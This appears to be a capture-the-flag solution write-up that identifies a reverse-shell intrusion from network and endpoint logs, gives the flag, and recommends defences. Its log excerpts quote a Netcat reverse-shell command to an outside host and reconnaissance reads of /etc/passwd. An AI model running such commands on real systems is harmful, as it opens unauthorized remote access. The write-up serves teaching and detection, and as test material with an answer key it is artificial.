# Identification - Solution

## Task
Analyze the network and endpoint logs to identify malicious activity.

---

## Analysis

### Network Logs (`traffic.pcap`)
The network logs reveal:
1. **Suspicious Connection**:
   - Source: `192.168.1.100` (compromised machine).
   - Destination: `203.0.113.5` (attacker’s C2 server).
   - Port: `4444` (commonly used by reverse shells).

2. **Command-and-Control (C2) Activity**:
   - Commands executed remotely:
     - `whoami` → Reveals attacker is running commands as `root`.
     - `cat /etc/passwd` → Shows the attacker accessed sensitive files.

---

### Endpoint Logs (`security_events.log`)
The endpoint logs reveal:
1. **Reverse Shell Execution**:
   ```plaintext
   [2024-11-18 10:11:05] Process Created: /bin/bash -c "nc -e /bin/bash 203.0.113.5 4444"
   ```
   - The attacker used `nc` (Netcat) to establish a reverse shell to the C2 server.

2. **Reconnaissance**:
   ```plaintext
   [2024-11-18 10:11:06] Process Executed: /usr/bin/whoami
   [2024-11-18 10:11:07] File Read: /etc/passwd
   ```
   - These logs show the attacker gathering information about the system.

---

## Flag
The malicious activity identified involves unauthorized remote access via a reverse shell.

**Flag**: `flag{reverse_shell_detected}`

---

## Recommendations

To mitigate and prevent this type of attack:

### 1. Network Monitoring
- Block unauthorized ports (e.g., `4444`) at the firewall.
- Use IDS/IPS tools (e.g., Snort, Suricata) to detect and alert on suspicious traffic patterns.

### 2. Endpoint Security
- Monitor process creation logs for suspicious commands like `nc` or `bash`.
- Disable potentially dangerous utilities like Netcat on production systems unless required.

### 3. Access Controls
- Implement the principle of least privilege to limit access to sensitive files like `/etc/passwd`.

### 4. Centralized Logging
- Aggregate and correlate network and endpoint logs in a SIEM for faster detection of coordinated attacks.

### 5. Incident Response
- Immediately isolate compromised systems.
- Investigate and terminate unauthorized connections.
- Review all accounts and services for unauthorized changes.

---

## Summary
The attacker’s activity included:
1. Establishing a reverse shell to `203.0.113.5` via port `4444`.
2. Executing reconnaissance commands (`whoami`, `cat /etc/passwd`).
3. Gaining full control of the system as `root`.

By analyzing network and endpoint logs, this activity can be detected and mitigated effectively.
